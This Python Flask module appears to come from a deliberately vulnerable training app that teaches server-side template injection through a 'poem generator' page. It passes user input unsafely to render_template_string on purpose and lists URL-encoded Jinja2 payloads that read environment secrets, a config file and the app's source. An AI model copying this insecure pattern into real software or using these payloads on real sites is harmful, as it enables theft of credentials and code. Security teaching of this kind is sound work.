from flask import Blueprint, request, render_template_string
from urllib.parse import unquote

secret_variable = "super_secret_db_pass"

ssti_bp = Blueprint('ssti_bp', __name__)


@ssti_bp.route('/ssti', methods=['GET', 'POST'])
def ssti():

    if request.method == 'GET':
        return render_template_string(make_template(""))

    try:
        encoded_name = request.form.get('name')
        name = unquote(encoded_name)

    except:
        poem = "Please enter the name"
        return render_template_string(make_template(poem))

    poem = f"""
            &emsp;In your smile, the world seems to glow,<br>
            &emsp;With you, my heart finds a love that grows.<br>
            &emsp;Your laughter's the music that brightens my day,<br>
            &emsp;Forever with you, my lovely {name}<br>"""

    try:
        return render_template_string(make_template(poem))
    except Exception as e:
        return render_template_string(make_template(e))


def make_template(poem):
    return f"""
        <!-- poem.html -->
            <!DOCTYPE html>
            <html>
                <head>
                    <title>SSTI Poem</title>
                    
                </head>
                <body>
                    <h1>Create good poem for your girlfriend</h1>
                    <a href="/" style="font-size: 18px;">Main page</a><br><br>
                    # This is the SSTI vulnerable page<br>
                    # SSTI is the vulnerability when user input implements into template with unsecure method<br>
                    # Typically, SSTIs occur when developer uses vulnerable template generation methods.<br>
                    # For example 'render_template_string' in Jinja2<br>
                    # Please read carefully source code in file vulns/ssti.py, 
                     but first try to exploit vulnerability here <br><br>

                    1) send girl's name into the the form and i will write a poem for this girl. Just try!<br>

                    <form action="/ssti" method="post">
                    <input type="text" name="name" placeholder="Enter your name" required size="80">
                    <input type="submit" value="Create poem">
                    </form>
                    <br><br>

                    {poem}
                    <br><br>

                    2) On the next step send first payload (url-encoded) %7B%7B 5 + 5 %7D%7D <br><br>
                    You see the result of mathematical operation 5+5. Try to send %7B%7B 5 * 5 %7D%7D <br><br>
                    
                    SSTI can pose really terrifying threats. Some dangerous payloads:<br><br>
                    1) environment variable stealing<br>
                    %7B%7B%20config.__class__.__init__.__globals__%5B%27os%27%5D.environ.get%28%27rsa_key%27%29%20%7D%7D <br><br>
                    
                    2) configuration file stealing<br>
                    %7B%7B%20config.__init__.__globals__%5B%27__builtins__%27%5D%5B%27open%27%5D%28%27configs%5C%5Capp_config.yaml%27%29.read%28%29%20%7D%7D <br><br>
                    
                    3) application source code stealing<br>
                    %7B%7B%20config.__init__.__globals__%5B%27__builtins__%27%5D%5B%27open%27%5D%28%27app.py%27%29.read%28%29%20%7D%7D <br><br>
                    
                    To avoid such vulnerabilities, use secure template creation tools. <br>
                    You should carefully research the presence of SSTI before using any template engine.

                </body>
            </html>
    """